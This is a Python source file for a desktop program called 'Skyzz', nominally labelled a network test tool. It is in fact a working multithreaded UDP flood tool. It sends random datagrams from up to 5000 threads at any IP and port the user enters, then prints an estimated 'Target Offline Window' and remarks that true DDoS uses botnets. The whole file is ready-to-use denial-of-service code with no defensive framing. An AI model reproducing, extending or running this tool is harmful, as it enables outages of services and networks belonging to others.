import tkinter as tk
from tkinter import ttk, messagebox, font
import socket
import random
import threading
import time
import math
import sys

SKYZZ_GLOBAL_ATTACK_THREAD_REF = None
SKYZZ_ATTACK_RUNNING_EVENT = threading.Event()
SKYZZ_TOTAL_PACKETS_SENT_APPROX = 0

SKYZZ_BG_COLOR = "#1a1a1d"
SKYZZ_ACCENT_COLOR = "#00ffff"
SKYZZ_TEXT_COLOR_PRIMARY = "#f0f0f5"
SKYZZ_SUCCESS_COLOR = "#39ff14"
SKYZZ_ERROR_COLOR = "#ff1f57"
SKYZZ_INFO_COLOR = "#8a2be2"
SKYZZ_DISABLED_BUTTON_COLOR = "#333338"
SKYZZ_ACTIVE_BUTTON_COLOR = SKYZZ_ACCENT_COLOR
SKYZZ_BUTTON_TEXT_COLOR = "#000000"
SKYZZ_ENTRY_BG_COLOR = "#2c2c30"

SKYZZ_FONT_PRIMARY_BOLD = ("Tahoma", 11, "bold")
SKYZZ_FONT_PRIMARY_NORMAL = ("Tahoma", 10)
SKYZZ_FONT_BANNER = ("Orbitron", 24, "bold")
SKYZZ_FONT_CONSOLE = ("Lucida Console", 9)


def skyzz_udp_flooder_individual_thread(target_ip, target_port, payload_size, stop_event):
    global SKYZZ_TOTAL_PACKETS_SENT_APPROX
    local_packets = 0
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data_payload = random._urandom(payload_size)
        while not stop_event.is_set():
            try:
                udp_socket.sendto(data_payload, (target_ip, target_port))
                local_packets += 1
            except socket.error:
                pass
            except Exception:
                pass
            time.sleep(0.00001)
    except Exception:
        pass
    finally:
        if 'udp_socket' in locals():
            udp_socket.close()
        return local_packets

def skyzz_attack_orchestrator_thread(target_ip, target_port, duration, num_threads, payload_size, gui_app_ref):
    global SKYZZ_TOTAL_PACKETS_SENT_APPROX
    SKYZZ_TOTAL_PACKETS_SENT_APPROX = 0

    gui_app_ref.gui_log_message(f"Skyzz Orchestrator: Initiating {num_threads} streams on {target_ip}:{target_port}...", "skyzz_accent")

    SKYZZ_ATTACK_RUNNING_EVENT.set()
    worker_threads = []
    thread_stop_events = []
    local_total_packets_from_threads = 0

    for i in range(num_threads):
        stop_event = threading.Event()
        thread_stop_events.append(stop_event)
        t = threading.Thread(target=lambda st_ev=stop_event: setattr(t, 'return_value', skyzz_udp_flooder_individual_thread(target_ip, target_port, payload_size, st_ev)), daemon=True)
        t.start()
        worker_threads.append(t)

    start_time = time.time()
    gui_app_ref.gui_log_message("Skyzz Orchestrator: Engagement protocol active.", "info")

    while time.time() - start_time < duration and SKYZZ_ATTACK_RUNNING_EVENT.is_set():
        remaining_time = duration - (time.time() - start_time)
        gui_app_ref.update_gui_during_attack(remaining_time)
        time.sleep(0.1)

    for stop_event in thread_stop_events:
        stop_event.set()

    if not SKYZZ_ATTACK_RUNNING_EVENT.is_set():
        gui_app_ref.gui_log_message("Skyzz Orchestrator: Engagement manually disengaged by user.", "error")
    else:
        gui_app_ref.gui_log_message("Skyzz Orchestrator: Engagement duration complete.", "info")

    gui_app_ref.gui_log_message("Skyzz Orchestrator: Collating engagement metrics...", "info")

    for t_obj in worker_threads:
        try:
            t_obj.join(timeout=1.0)
            if hasattr(t_obj, 'return_value') and t_obj.return_value is not None:
                local_total_packets_from_threads += t_obj.return_value
        except Exception as e:
            gui_app_ref.gui_log_message(f"Skyzz Orchestrator: Thread collation anomaly: {e}", "error")

    SKYZZ_TOTAL_PACKETS_SENT_APPROX = local_total_packets_from_threads
    SKYZZ_ATTACK_RUNNING_EVENT.clear()
    gui_app_ref.finish_attack_gui_updates(duration, num_threads, payload_size)

def skyzz_calculate_impact_factor(num_threads, payload_size_bytes, duration_seconds):
    effective_threads = min(num_threads, 750)
    thread_factor = (effective_threads / 750) * 0.6
    effective_payload = min(payload_size_bytes, 1420)
    payload_factor = (effective_payload / 1420) * 0.4
    base_pif = thread_factor + payload_factor
    duration_modifier = math.log10(max(1, duration_seconds) + 1) / 1.8
    final_pif = base_pif * (1 + duration_modifier)
    return min(final_pif, 6.0)

def skyzz_get_downtime_estimation_texts(pif_score, attack_duration_seconds):
    global SKYZZ_TOTAL_PACKETS_SENT_APPROX
    lines = []
    lines.append("--- Skyzz Analysis ---")
    lines.append(f"Total Datagrams Transmitted: {SKYZZ_TOTAL_PACKETS_SENT_APPROX:,}.")
    lines.append(f"Calculated Potential Impact Factor (PIF): {pif_score:.2f}")

    min_multiplier, max_multiplier = 0.0, 0.05
    description = "Minimal resonance detected. Target likely unaffected or highly resilient."

    if pif_score < 0.4: min_multiplier, max_multiplier, description = 0.0, 0.15, "Low-level resonance. Negligible impact expected on robust systems."
    elif pif_score < 0.9: min_multiplier, max_multiplier, description = 0.1, 0.7, "Moderate resonance. Fragile systems may have experienced transient instability for the engagement period."
    elif pif_score < 1.8: min_multiplier, max_multiplier, description = 0.7, 1.6, "Significant resonance. Perceptible disruption likely. Recovery estimated within 0.7x to 1.6x engagement duration."
    elif pif_score < 2.8: min_multiplier, max_multiplier, description = 1.3, 3.2, "High-impact resonance. Target system stress probable. Disruption window: 1.3x to 3.2x engagement duration."
    elif pif_score < 4.0: min_multiplier, max_multiplier, description = 2.2, 5.5, "Severe resonance. System degradation or temporary outage likely. Recovery may require 2.2x to 5.5x engagement duration, potential minor intervention."
    else: min_multiplier, max_multiplier, description = 3.5, 12.0, (f"Extreme resonance protocol achieved. For vulnerable targets, sustained outage "
                       f"possible (3.5x to 12x engagement duration) pending manual system remediation.")

    min_downtime_est = attack_duration_seconds * min_multiplier
    max_downtime_est = attack_duration_seconds * max_multiplier

    lines.append(f"\nSkyzz Tactical Projection:")
    lines.append(description)

    if max_downtime_est > 0:
        lines.append(f"Projected Target Offline Window: {min_downtime_est:.1f} to {max_downtime_est:.1f} seconds post-engagement.")
    else:
        lines.append("Projected impact duration sub-threshold for reliable estimation.")

    lines.append("\nOperational Caveats:")
    lines.append("  1. Target Defenses: Advanced mitigation (firewalls, dedicated services) significantly alters outcome.")
    lines.append("  2. Network Provider Response: Anomalous traffic may trigger ISP-level filtering or null-routing.")
    lines.append("  3. Vector Singularity: This tool operates from a single origin. True DDoS leverages distributed botnets.")
    lines.append("  4. Dynamic Environment: Projections are heuristic, not deterministic certitude.")
    return lines

class SkyzzInterfaceApp:
    def __init__(self, master):
        self.master = master
        master.title("⚡ Skyzz ")
        master.geometry("720x800")
        master.configure(bg=SKYZZ_BG_COLOR)
        master.resizable(False, False)

        self.font_banner = font.Font(family="Orbitron", size=24, weight="bold")
        self.font_label_bold = font.Font(family="Tahoma", size=11, weight="bold")
        self.font_entry = font.Font(family="Verdana", size=10)
        self.font_button = font.Font(family="Arial Black", size=10, weight="bold")
        self.font_console = font.Font(family="Lucida Console", size=9)

        self.create_skyzz_widgets()

    def create_skyzz_widgets(self):
        banner_frame = tk.Frame(self.master, bg=SKYZZ_BG_COLOR)
        banner_frame.pack(pady=(15,10))
        tk.Label(banner_frame, text="SKYZZ", font=self.font_banner, bg=SKYZZ_BG_COLOR, fg=SKYZZ_ACCENT_COLOR).pack()
        tk.Label(banner_frame, text="NETWORK TEST TOOL", font=("Orbitron", 10), bg=SKYZZ_BG_COLOR, fg=SKYZZ_TEXT_COLOR_PRIMARY).pack()

        main_content_frame = tk.Frame(self.master, bg=SKYZZ_BG_COLOR)
        main_content_frame.pack(pady=10, padx=25, fill="both", expand=True)

        input_section_frame = tk.LabelFrame(main_content_frame, text=" Target Parameters ", font=self.font_label_bold, bg=SKYZZ_BG_COLOR, fg=SKYZZ_TEXT_COLOR_PRIMARY, bd=2, relief="groove", padx=10, pady=10)
        input_section_frame.pack(fill="x", pady=(0,15))
        input_section_frame.columnconfigure(1, weight=1)

        labels = ["Target IP Address:", "Target Port (1-65535):", "Duration (seconds):", "Stream Intensity (Threads):", "Datagram Size (Bytes):"]
        entries = ["ip_entry", "port_entry", "duration_entry", "threads_entry", "payload_entry"]
        defaults = ["127.0.0.1", "80", "30", "250", "1024"]

        for i, label_text in enumerate(labels):
            tk.Label(input_section_frame, text=label_text, font=self.font_label_bold, bg=SKYZZ_BG_COLOR, fg=SKYZZ_TEXT_COLOR_PRIMARY).grid(row=i, column=0, padx=5, pady=7, sticky="w")
            entry_var = tk.Entry(input_section_frame, font=self.font_entry, width=25 if i==0 else 10, bg=SKYZZ_ENTRY_BG_COLOR, fg=SKYZZ_TEXT_COLOR_PRIMARY, insertbackground=SKYZZ_TEXT_COLOR_PRIMARY, relief="flat", bd=2)
            entry_var.grid(row=i, column=1, padx=5, pady=7, sticky="ew" if i == 0 else "w")
            entry_var.insert(0, defaults[i])
            setattr(self, entries[i], entry_var)

        control_button_frame = tk.Frame(main_content_frame, bg=SKYZZ_BG_COLOR)
        control_button_frame.pack(pady=15)

        self.start_button = tk.Button(control_button_frame, text="⚡ INICIAR ⚡", font=self.font_button,
                                      bg=SKYZZ_ACTIVE_BUTTON_COLOR, fg=SKYZZ_BUTTON_TEXT_COLOR, relief="raised", bd=3,
                                      command=self.skyzz_start_attack, width=28, height=2,
                                      activebackground="#00dddd", activeforeground=SKYZZ_BUTTON_TEXT_COLOR)
        self.start_button.pack(side=tk.LEFT, padx=12)

        self.stop_button = tk.Button(control_button_frame, text="🛑 PARAR 🛑", font=self.font_button,
                                     bg=SKYZZ_DISABLED_BUTTON_COLOR, fg=SKYZZ_BUTTON_TEXT_COLOR, relief="raised", bd=3,
                                     command=self.skyzz_stop_attack, width=28, height=2, state=tk.DISABLED,
                                     activebackground="#555555", activeforeground=SKYZZ_BUTTON_TEXT_COLOR)
        self.stop_button.pack(side=tk.LEFT, padx=12)

        self.status_label_var = tk.StringVar()
        self.status_label_var.set("System Standby. Awaiting Directives.")
        status_display_label = tk.Label(main_content_frame, textvariable=self.status_label_var, font=SKYZZ_FONT_PRIMARY_NORMAL, bg=SKYZZ_BG_COLOR, fg=SKYZZ_INFO_COLOR)
        status_display_label.pack(pady=10)

        log_frame = tk.LabelFrame(main_content_frame, text=" Comms Log ", font=self.font_label_bold, bg=SKYZZ_BG_COLOR, fg=SKYZZ_TEXT_COLOR_PRIMARY, bd=2, relief="groove", padx=5, pady=5)
        log_frame.pack(pady=10, fill="both", expand=True)

        self.console_log = tk.Text(log_frame, height=10, bg="#222225", fg=SKYZZ_TEXT_COLOR_PRIMARY,
                                   font=self.font_console, relief="sunken", bd=1, wrap=tk.WORD,
                                   insertbackground=SKYZZ_TEXT_COLOR_PRIMARY, selectbackground=SKYZZ_ACCENT_COLOR)
        self.console_log.pack(side=tk.LEFT, fill="both", expand=True, padx=5, pady=5)

        log_scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.console_log.yview)
        log_scrollbar.pack(side=tk.RIGHT, fill="y")
        self.console_log.config(yscrollcommand=log_scrollbar.set, state=tk.DISABLED)

        self.console_log.tag_configure("skyzz_accent", foreground=SKYZZ_ACCENT_COLOR, font=(self.font_console.cget("family"), self.font_console.cget("size"), "bold"))
        self.console_log.tag_configure("error", foreground=SKYZZ_ERROR_COLOR)
        self.console_log.tag_configure("success", foreground=SKYZZ_SUCCESS_COLOR)
        self.console_log.tag_configure("info", foreground=SKYZZ_INFO_COLOR)
        self.console_log.tag_configure("default", foreground=SKYZZ_TEXT_COLOR_PRIMARY)

        self.gui_log_message("Skyzz Engagement Suite Initialized. Operate with precision.", "info")

    def gui_log_message(self, message, tag="default"):
        def _log():
            self.console_log.config(state=tk.NORMAL)
            current_time = time.strftime('%H:%M:%S')
            self.console_log.insert(tk.END, f"[SKYZZ-{current_time}] {message}\n", tag)
            self.console_log.see(tk.END)
            self.console_log.config(state=tk.DISABLED)
        if threading.current_thread() is not threading.main_thread():
            self.master.after(0, _log)
        else:
            _log()

    def skyzz_validate_inputs(self):
        try:
            ip = self.ip_entry.get()
            socket.inet_aton(ip)
            port = int(self.port_entry.get())
            if not (1 <= port <= 65535): raise ValueError("Port (1-65535)")
            duration = int(self.duration_entry.get())
            if duration <= 0: raise ValueError("Duration (>0s)")
            threads = int(self.threads_entry.get())
            if not (1 <= threads <= 5000): raise ValueError("Stream Intensity (1-5000)")
            payload = int(self.payload_entry.get())
            if not (1 <= payload <= 1420): raise ValueError("Datagram Size (1-1420 Bytes)")
            return ip, port, duration, threads, payload
        except socket.error:
            messagebox.showerror("Parameter Error", "Invalid Target IP Address.", parent=self.master)
            return None
        except ValueError as e:
            messagebox.showerror("Parameter Error", f"Invalid Input: {e}. Review parameters.", parent=self.master)
            return None

    def skyzz_start_attack(self):
        global SKYZZ_GLOBAL_ATTACK_THREAD_REF
        if SKYZZ_ATTACK_RUNNING_EVENT.is_set():
            messagebox.showwarning("Operation Active", "Network engagement protocol is currently active.", parent=self.master)
            self.gui_log_message("INITIATE: Engagement already active. Command overridden.", "info")
            return

        self.gui_log_message("INITIATE: Validating engagement parameters...", "info")
        inputs = self.skyzz_validate_inputs()
        if not inputs:
            self.gui_log_message("INITIATE: Parameter validation failed. Standby.", "error")
            return

        ip, port, duration, threads_val, payload = inputs

        self.start_button.config(state=tk.DISABLED, bg=SKYZZ_DISABLED_BUTTON_COLOR)
        self.stop_button.config(state=tk.NORMAL, bg=SKYZZ_ERROR_COLOR)
        self.gui_log_message(f"INITIATE: Commencing engagement on {ip}:{port}...", "skyzz_accent")
        self.status_label_var.set(f"Engaging {ip}:{port}... Standby for telemetry.")

        SKYZZ_GLOBAL_ATTACK_THREAD_REF = threading.Thread(target=skyzz_attack_orchestrator_thread,
                                         args=(ip, port, duration, threads_val, payload, self),
                                         daemon=True)
        SKYZZ_GLOBAL_ATTACK_THREAD_REF.start()
        self.gui_log_message("INITIATE: Orchestrator thread deployed. Monitoring.", "success")

    def skyzz_stop_attack(self):
        self.gui_log_message("CEASE: Disengagement directive received...", "info")
        if SKYZZ_ATTACK_RUNNING_EVENT.is_set():
            SKYZZ_ATTACK_RUNNING_EVENT.clear()
            self.gui_log_message("CEASE: Signal dispatched to orchestrator. Awaiting confirmation.", "error")
            self.stop_button.config(state=tk.DISABLED, bg=SKYZZ_DISABLED_BUTTON_COLOR)
        else:
            self.gui_log_message("CEASE: No active engagement protocol detected. System idle.", "info")
            self.start_button.config(state=tk.NORMAL, bg=SKYZZ_ACTIVE_BUTTON_COLOR)
            self.stop_button.config(state=tk.DISABLED, bg=SKYZZ_DISABLED_BUTTON_COLOR)

    def update_gui_during_attack(self, remaining_time):
        spinner_chars = ['◢', '◣', '◤', '◥']
        char = spinner_chars[int(time.time()*4) % len(spinner_chars)]
        status_text = f"Engagement Active {char} T-{remaining_time:.1f}s {char}"
        def _update():
            self.status_label_var.set(status_text)
        self.master.after(0, _update)

    def finish_attack_gui_updates(self, duration, num_threads, payload_size):
        def _update_on_main_thread():
            self.gui_log_message("POST-ENGAGEMENT: Updating interface for operation conclusion.", "success")
            self.start_button.config(state=tk.NORMAL, bg=SKYZZ_ACTIVE_BUTTON_COLOR)
            self.stop_button.config(state=tk.DISABLED, bg=SKYZZ_DISABLED_BUTTON_COLOR)
            self.status_label_var.set("Engagement Concluded. Analyzing Telemetry...")
            self.gui_log_message("Engagement protocol terminated.", "success")

            pif = skyzz_calculate_impact_factor(num_threads, payload_size, duration)
            estimation_lines = skyzz_get_downtime_estimation_texts(pif, duration)
            for line_content in estimation_lines:
                tag_to_use = "info"
                if "Skyzz Tactical Projection" in line_content or "Caveats" in line_content: tag_to_use = "skyzz_accent"
                elif "Projected Target Offline Window" in line_content: tag_to_use = "success"
                self.gui_log_message(line_content, tag_to_use)

            self.status_label_var.set("System Ready. Awaiting New Directives. ⚡")
            self.gui_log_message("Standby for further instructions.", "info")

        self.master.after(0, _update_on_main_thread)

if __name__ == "__main__":
    root = tk.Tk()

    app = SkyzzInterfaceApp(root)
    root.mainloop()